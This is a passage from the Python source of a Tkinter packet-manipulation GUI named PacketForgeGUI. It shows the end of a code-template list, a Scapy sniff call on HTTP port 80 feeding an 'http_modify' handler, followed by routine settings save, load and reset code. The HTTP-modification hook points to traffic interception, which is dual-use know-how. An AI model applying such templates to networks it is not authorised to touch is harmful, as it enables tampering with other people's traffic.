sniff(filter="tcp and port 80", prn=http_modify, store=0)
"""
        }
        
        if template_name in templates:
            self.code_editor.delete("1.0", tk.END)
            self.code_editor.insert("1.0", templates[template_name])
            self.log(f"Loaded {template_name} template")

    # ====== Settings Methods ======
    def save_settings(self):
        """Save application settings"""
        try:
            settings = {
                "interface": self.selected_interface.get(),
                "buffer_size": self.buffer_size.get(),
                "promiscuous_mode": self.promiscuous_mode.get(),
                "theme": self.app_theme.get(),
                "font_size": self.font_size.get(),
                "save_session": self.save_session.get(),
                "use_encryption": self.use_encryption.get(),
                "log_level": self.log_level.get()
            }
            
            filepath = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Save Settings"
            )
            
            if not filepath:
                return
                
            with open(filepath, 'w') as f:
                json.dump(settings, f, indent=4)
                
            self.log(f"Settings saved to {filepath}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save settings: {str(e)}")

    def load_settings(self):
        """Load application settings"""
        try:
            filepath = filedialog.askopenfilename(
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Load Settings"
            )
            
            if not filepath:
                return
                
            with open(filepath, 'r') as f:
                settings = json.load(f)
                
            # Apply settings
            self.selected_interface.set(settings.get("interface", ""))
            
            self.buffer_size.delete(0, tk.END)
            self.buffer_size.insert(0, settings.get("buffer_size", "100"))
            
            self.promiscuous_mode.set(settings.get("promiscuous_mode", True))
            
            self.app_theme.set(settings.get("theme", "Dark"))
            
            self.font_size.set(settings.get("font_size", "10"))
            
            self.save_session.set(settings.get("save_session", True))
            
            self.use_encryption.set(settings.get("use_encryption", True))
            
            self.log_level.set(settings.get("log_level", "INFO"))
            
            self.log(f"Settings loaded from {filepath}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load settings: {str(e)}")

    def reset_settings(self):
        """Reset settings to default values"""
        try:
            self.selected_interface.set(list(self.interfaces.keys())[0] if self.interfaces else "")
            self.buffer_size.delete(0, tk.END)
            self.buffer_size.insert(0, "100")
            self.promiscuous_mode.set(True)
            self.app_theme.set("Dark")
            self.font_size.set("10")
            self.save_session.set(True)
            self.use_encryption.set(True)
            self.log_level.set("INFO")
            
            self.log("Settings reset to defaults")
            messagebox.showinfo("Success", "Settings reset to default values")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to reset settings: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = PacketForgeGUI(root)
    root.mainloop()